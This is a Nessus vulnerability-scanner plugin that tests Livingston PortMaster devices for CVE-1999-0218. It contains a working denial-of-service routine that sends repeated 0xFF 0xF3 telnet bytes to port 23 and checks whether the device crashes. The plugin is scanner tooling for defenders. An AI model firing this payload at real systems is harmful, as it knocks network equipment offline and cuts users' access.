#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10182);
 script_version("$Revision: 1.23 $");
 script_cvs_date("$Date: 2014/05/26 15:30:09 $");

 script_cve_id("CVE-1999-0218");
 script_bugtraq_id(2225);
 script_osvdb_id(1732);

 script_name(english:"Livingston PortMaster ComOS Malformed Packet Remote DoS");
 script_summary(english:"Crashes the remote portmaster");

 script_set_attribute(attribute:"synopsis", value:"The remote server is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote Livingston portmaster by
overflowing its buffers by sending several times the two chars :

 0xFF 0xF3

An attacker may use this flaw to prevent you to use your internet
access.");
 script_set_attribute(attribute:"solution", value:"Contact your vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

 script_set_attribute(attribute:"vuln_publication_date", value:"1995/09/10");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/08/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_require_keys("Settings/ParanoidReport");
 script_require_ports(23);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

crp = raw_string(0xFF, 0xF3, 0xFF, 0xF3, 0xFF, 0xF3, 0xFF, 0xF3, 0xFF, 0xF3);

port = 23;

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  #
  # Send the crap ten times
  #

  start_denial();
  send(socket:soc, data:crp, length:10) x 10;

  close(soc);

  alive = end_denial();

  if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(0);
                }
  }
}
